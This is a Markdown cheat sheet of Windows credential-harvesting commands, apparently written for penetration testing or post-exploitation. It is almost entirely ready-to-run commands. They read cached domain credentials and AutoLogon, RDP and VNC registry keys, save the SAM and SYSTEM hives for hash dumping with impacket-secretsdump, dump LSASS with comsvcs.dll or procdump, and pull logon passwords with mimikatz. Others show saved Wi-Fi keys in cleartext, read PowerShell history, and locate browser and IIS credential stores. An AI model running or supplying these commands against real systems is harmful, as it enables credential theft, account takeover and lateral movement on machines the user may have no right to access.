# Local Account Passwords

#### Enumerating Local User Accounts
- List all local user accounts:
	```cmd
	net user
	```

#### Cached Domain Credentials
Windows caches domain credentials locally, which can be queried:

- Query Cached Domain Credentials:
	```cmd
	reg query "HKLM\SECURITY\Cache"
	```

# Credential Files and Cleartext Passwords

#### Searching for Sensitive Information
- Search for files containing "password":
	```cmd
	dir C:\ /S /P | findstr "password"
	```
	- Recursively searches for files with "password" in their name or content.

#### Unattended Windows Installation Files
- Check for unattended Windows installation files that may contain passwords:
	```cmd
	dir C:\ /S /P | findstr /i unattend.xml
	```
	Files of interest:
	- `C:\Unattend.xml`
	- `C:\Windows\Panther\Unattend.xml`

#### Searching the Registry for Passwords
- Search for "password" in the registry:
	```cmd
	reg query HKCU /f password /t REG_SZ /s
	```
	- This searches for any registry entries with "password" under `HKEY_CURRENT_USER`.

# Saved Credentials and Cached Information

#### Windows Credential Manager
- List saved credentials:
	```cmd
	cmdkey /list
	```

#### Retrieve PowerShell History
- PowerShell stores command history in a file that may contain sensitive information:
	```cmd
	type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
	```

#### Windows AutoLogon Credentials
- Query AutoLogon credentials:
	```cmd
	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
	```

# SAM Database and NTLM Hashes

#### Extracting NTLM Hashes from SAM Database
1. Save the SAM and SYSTEM hives:
	```cmd
	reg save HKLM\SAM C:\temp\SAM
	reg save HKLM\SYSTEM C:\temp\SYSTEM
	```

2. Use external tools like `impacket-secretsdump` to dump hashes:
	```bash
	impacket-secretsdump -sam C:\temp\SAM -system C:\temp\SYSTEM LOCAL
	```

# LSASS Dump for Credential Extraction

#### Dump LSASS Process
- Dump LSASS process using `comsvcs.dll`:
	```cmd
	rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
	```
- Alternatively, use `procdump`:
	```cmd
	procdump -accepteula -ma lsass.exe C:\temp\lsass.dmp
	```

#### Extract Credentials from LSASS Dump with Mimikatz
- Extract credentials using `mimikatz`:
	```cmd
	mimikatz "sekurlsa::minidump C:\temp\lsass.dmp" "sekurlsa::logonPasswords" exit
	```

# Extracting Wi-Fi Passwords

#### List Saved Wi-Fi Profiles
- List all saved Wi-Fi profiles:
	```cmd
	netsh wlan show profiles
	```

#### Dump Wi-Fi Password for Specific Profile
- View the password for a specific profile:
	```cmd
	netsh wlan show profile name="<Wi-Fi Profile Name>" key=clear
	```

# Remote Desktop Credentials

#### List Saved RDP Credentials
- Check saved RDP connections:
	```cmd
	reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
	```

- Query default RDP credentials:
	```cmd
	reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
	```

# Web Browsers Stored Credentials

#### Internet Explorer and Edge Credentials
- Extract saved forms from Internet Explorer:
	```cmd
	reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2"
	```

#### Chrome and Firefox Credentials
- Chrome stores credentials in SQLite databases in the profile directory:
	```cmd
	dir "%localappdata%\Google\Chrome\User Data\Default\Login Data"
	```
- Firefox stores credentials in the user profile:
	```cmd
	dir "%appdata%\Mozilla\Firefox\Profiles"
	```

# Miscellaneous Credential Locations

#### IIS (Internet Information Services) Configuration
- IIS configuration files may contain credentials:
	```cmd
	type C:\inetpub\wwwroot\web.config | findstr connectionString
	```

#### VNC (Virtual Network Computing) Credentials
- Query VNC passwords from the registry:
	```cmd
	reg query "HKCU\Software\RealVNC\WinVNC4"
	```